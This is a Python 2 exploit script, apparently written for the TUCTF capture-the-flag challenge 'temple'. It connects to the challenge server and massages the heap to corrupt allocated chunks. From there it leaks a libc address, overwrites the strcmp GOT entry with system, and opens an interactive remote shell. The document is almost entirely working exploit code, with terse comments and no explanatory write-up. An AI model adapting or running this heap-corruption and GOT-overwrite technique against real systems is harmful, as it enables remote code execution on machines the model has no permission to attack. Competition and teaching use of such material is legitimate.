#!/usr/bin/env python
import socket
import random
import binascii
from time import sleep
import struct
# No pwntools because who needs that, right???

packaddr = lambda x: struct.pack("<Q", x)

HOST = 'temple.tuctf.com'
PORT = 4343


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def sendresp(text, p=True):
	s.sendall(text + "\n")
	sleep(.2)
	print '--> ' + repr(text)
	data = s.recv(65536)
	if p:
		print '<-- ' + data
		print "---------------------\n\n"
	sleep(.2)
	return data

data = s.recv(65536)
print data

# massage the heap...
sendresp('2') # wisdom 8
sendresp('16')
sendresp('0123456789ABCDEF')
sendresp('2') # wisdom 9
sendresp('16')
sendresp('0123456789ABCDEF')
sendresp('2') # wisdom 10
sendresp('16')
sendresp('0123456789ABCDEF')
sendresp('1') # free 9
sendresp('9')
sendresp('2') # wisdom 11, this corrupts 10
sendresp('64')

# reading libc addr
sendresp(('\x00\x00\x00\x00\x00\x00\x00\x00' * 4) + '\x08\x00\x00\x00\x00\x00\x00\x00' + packaddr(0x603038) + '\x08\x00\x00\x00\x00\x00\x00\x00' + '\x38\x30\x60\x00\x00\x00\x00\x00')
sendresp('1') # free corrupted 10, leak libcbase
readout = sendresp('10')
leaked=readout[0:8]

print
print
print
print
print repr(leaked)
print binascii.hexlify(leaked)
addr = struct.unpack("<Q", leaked)[0]
print 'leak = 0x%08x' % (addr,)

libcbase = addr - 0x81c10
system = libcbase + 0x41490
binsh = libcbase + 0x1633e8
print 'libcbase = 0x%08x' % (libcbase,)
print 'system = 0x%08x' % (system,)
print 'binsh = 0x%08x' % (binsh,)
print
print
print
print

# massage the heap...
sendresp('2') # wisdom 12
sendresp('16')
sendresp('0123456789ABCDEF')
sendresp('2') # wisdom 13
sendresp('16')
sendresp('0123456789ABCDEF')
sendresp('2') # wisdom 14
sendresp('16')
sendresp('0123456789ABCDEF')
sendresp('1') # free 13
sendresp('13')
sendresp('2') # wisdom 15, this corrupts 14
sendresp('64')

# getting shell, we overwrite strcmp GOT with system, text hijack to strcmpGOT, character hijack to /bin/sh ptr
sendresp(('\x00\x00\x00\x00\x00\x00\x00\x00' * 4) + '\x08\x00\x00\x00\x00\x00\x00\x00' + '\x70\x30\x60\x00\x00\x00\x00\x00' + packaddr(len('/bin/sh')) + packaddr(binsh))
#                                							 text len								text ptr 							name len						name ptr

# overwrite strcmpGOT with system 
sendresp('3') # exploit corrupted 14
sendresp('14')
sendresp(packaddr(system)) # system

# call free on wisdom 10 to trigger strcmp
sendresp('1') # free corrupted 14, strcmp is replaced with system thanks to earlier, now we use character ptr from corrupted 14
data = sendresp('14') # BOOM shell
print repr(data)
print binascii.hexlify(data)

print
print
try:
	while True:
		sendresp(raw_input('$ '))
except KeyboardInterrupt:
	pass

s.close()
